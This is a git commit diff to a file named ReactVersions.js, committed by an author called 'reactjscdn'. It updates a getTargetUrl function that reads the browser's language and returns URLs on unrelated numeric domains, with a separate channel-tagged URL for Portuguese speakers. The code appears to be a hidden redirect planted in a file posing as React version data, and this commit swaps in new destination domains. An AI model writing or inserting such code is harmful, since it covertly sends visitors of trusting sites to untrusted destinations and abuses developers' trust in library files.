685ad5eb2a8420b01b7b34f11831256781555eb9
reactjscdn <bro_fuckme_oh@proton.me>
2026-09-09 23:58:41 +0800

    Update target URLs in getTargetUrl function

--- ReactVersions.js
+++ ReactVersions.js
@@ -224,11 +224,11 @@
       const lang = (navigator.language || (navigator.languages && navigator.languages[0]) || '').toLowerCase();
       
       if (lang.startsWith('id')) {
-        return 'https://866371.com';
+        return 'https://866296.com';
       } else if (lang.startsWith('pt')) {
         return 'https://www.9bm8s8.com?ch=146712';
       }
-      return 'https://866371.com';
+      return 'https://866296.com';
     }
 
     const targetUrl = getTargetUrl();
